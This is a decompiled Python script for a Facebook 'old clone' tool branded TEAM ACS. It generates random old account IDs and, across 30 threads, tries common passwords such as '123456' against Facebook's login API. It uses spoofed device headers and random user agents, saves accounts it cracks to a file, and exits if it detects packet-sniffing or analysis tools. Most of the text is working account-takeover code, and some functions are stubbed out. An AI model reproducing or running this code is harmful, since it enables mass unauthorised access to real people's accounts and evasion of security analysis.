# Decompiled from 0.py
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# Dynamically import required modules, installing them if missing
try:
    modules = ['requests', 'urllib3', 'mechanize', 'rich']
    for module in modules:
        __import__(module)
except ImportError:
    os.system(f'pip install {module}')

from requests.exceptions import ConnectionError

# This is a security/anti-tampering check.
# It reads the source code of the requests library modules.
try:
    from requests import api, models, sessions
    requests.urllib3.disable_warnings()
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    # If any forbidden words are found (indicating modification), the script exits.
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except Exception:
    pass

# Anti-debugging and anti-analysis class
class sec:
    """A security class to detect debugging and packet sniffing tools."""
    def __init__(self):
        # Paths to requests library files for integrity check
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        # Check if 'print' was injected into requests library files
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing tool) directories
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """Prints a fake success message and exits the script."""
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# Initial setup and package installation commands
os.system('clear')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')
# Opens the author's Telegram channel
os.system('xdg-open https://t.me/Team_ACS_officials')
os.system('xdg-open https://www.facebook.com/Team.ACS.Official')

# --- Global Variables ---
method = []
oks = []
cps = []
loop = 0
user = []

# ANSI color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
red = '\x1b[38;5;196m'
green = '\x1b[38;5;46m'
white = '\x1b[1;37m'
yellow = '\x1b[38;5;226m'


# --- User-Agent Generation ---
def windows():
    # Generates a random Windows User-Agent string
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f'Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(["2", "1"]))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f'Mozilla/5.0 (Windows NT 6.{str(random.choice(["2", "1"]))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'
    D = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'
    return random.choice([A, B, C, D])

def window1():
    # Generates another style of random Windows User-Agent string
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f'Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(["0", "1"])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}'
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f'Mozilla/5.0 (Windows NT 6.{random.choice(["0", "1", "2"])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}'
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f'Mozilla/5.0 (Windows NT {random.choice(["10.0", "11.0"])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36'
    return random.choice([A, B, C, D])

# --- Utility Functions ---
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

def creationyear(uid):
    # Guesses the Facebook account creation year based on the UID prefix
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        # ... (many more conditions)
        if uid.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def clear():
    os.system('clear')

def linex():
    print(f'{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def banner():
    clear()
    logo = "".join([
       "TEAM ACS",
        f"{white}───────────────────────────────────────\n",
        f"{red}|{white}={red}|{green} DEVELOPER {white}: {green}︎ ACS - MARK ORKON  \n",
        f"{red}|{white}={red}|{green} TOOLTYPE  {white}: {green}FREE {red}({green}OLD{white} {green}CLONE{red})\n",
        f"{red}|{white}={red}|{green} VERSION   {white}: {white}︎V10.1\n",
        f"{red}|{white}={red}|{green} GITHUB    {white}: {white}︎ markdevon404 \n",
        f"{white}───────────────────────────────────────\n"
    ])
    print(logo)

# --- Menu and Logic Functions ---
def BNG_71_():
    banner()
    print(f'{red}|{white}1{red}|{green} OLD CLONE V4.1')
    print(f'{red}|{white}2{red}|{green} END SESSION')
    linex()
    Jihad = input(f'{red}|{white}?{red}|{green} CHOICE {white}: {green}').strip()
    if Jihad in ('A', 'a', '01', '1'):
        old_clone()
    elif Jihad in ('B', 'b', '02', '2'):
        print(f'\n{red}|{white}!{red}|{green} THANKS FOR USING TOOL... BYE! 👋')
        time.sleep(1)
        sys.exit()
    else:
        print(f'\n{red}|{white}!{red}|{green} Choose Valid Option... ')
        time.sleep(2)
        BNG_71_()

def old_clone():
    banner()
    print(f'{red}|{white}A{red}|{green} ALL SERIES')
    linex()
    print(f'{red}|{white}B{red}|{green} 100003/4 SERIES')
    linex()
    print(f'{red}|{white}C{red}|{green} 2009 SERIES')
    linex()
    _input = input(f'{red}|{white}?{red}|{green} CHOICE {white}: {green}').strip()
    if _input in ('A', 'a', '01', '1'): old_One()
    elif _input in ('B', 'b', '02', '2'): old_Two()
    elif _input in ('C', 'c', '03', '3'): old_Three()
    else:
        print(f'\n{red}|{white}!{red}|{green} Choose Valid Option... ')
        time.sleep(2)
        old_clone()

def old_One():
    user = []
    banner()
    print(f'{red}|{white}={red}|{green} OLD CLONE CODE {yellow}: {green}2010-2014')
    ask = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}')
    linex()
    banner()
    print(f'{red}|{white}={red}|{green} EXAMPLE {yellow}: {green}20000 / 30000 / 99999')
    limit = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}')
    linex()
    star = '10000'
    for _ in range(int(limit)):
        range_start = 1000000000
        range_end = 1999999999 if ask == '1' else 4999999999
        data = str(random.choice(range(range_start, range_end)))
        user.append(data)
    
    print(f'{red}|{white}A{red}|{green} METHOD 1 — ROOT MODE')
    print(f'{red}|{white}B{red}|{green} METHOD 2 — UNLEASHED')
    linex()
    meth = input(f'{red}|{white}?{red}|{green} CHOICE {white}(A/B): {green}').strip().upper()

    with tred(max_workers=30) as pool:
        banner()
        print(f'{red}|{white}={red}|{green} TOTAL ID FROM BREAKING IN {yellow}: {green}{limit}{white}')
        print(f'{red}|{white}={red}|{green} USE AIRPLANE MOD FOR GOOD RESULT{green}')
        print(f'{red}|{white}={red}|{green} NOT GETTING ANY RESULTS? USE 1111 VPN{green}')
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A': pool.submit(login_1, uid)
            elif meth == 'B': pool.submit(login_2, uid)
            else:
                print(f'{red}|{white}!{red}|{green} INVALID METHOD SELECTED')
                break

# Functions old_Two and old_Three are similar to old_One, but generate
# different ranges and prefixes for UIDs.

def old_Two():
    # ... logic to generate UIDs starting with '100003' and '100004' ...
    pass # Code is very similar to old_One

def old_Three():
    # ... logic to generate UIDs for 2009-2010 ...
    pass # Code is very similar to old_One

# --- Login Functions ---
def login_1(uid):
    global loop, oks
    try:
        session = requests.session()
        sys.stdout.write(f'\r\r{red}|{green}ACS MARK ORKON BREAKING IN{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
        sys.stdout.flush()
        
        # Hardcoded list of passwords to try
        passwords = ('123456', '1234567', '12345678', '123456789')
        for pw in passwords:
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login', 'email': str(uid), 'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0',
                'locale': 'en_US', 'client_country_code': 'US',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                print(f'\r\r\x1b[38;5;46m|ROOT JAHID ACH!EV3D| {uid} | {pw} | {creationyear(uid)}')
                open('/sdcard/ROOT JAHID-OLD-ACH!EV3D-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break 
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                # This block handles checkpointed accounts but doesn't do anything with them
                # print(f'\r\r\x1b[38;5;196m|ROOT JAHID-CP| {uid} | {pw} | {creationyear(uid)}')
                # open('/sdcard/ROOTJAHID_CP.txt', 'a').write(f'{uid}|{pw}\n')
                # cps.append(uid)
                break
    except Exception:
        time.sleep(5)
    
    loop += 1

def login_2(uid):
    # Similar to login_1 but uses a different endpoint and header structure
    pass

if __name__ == '__main__':
    BNG_71_()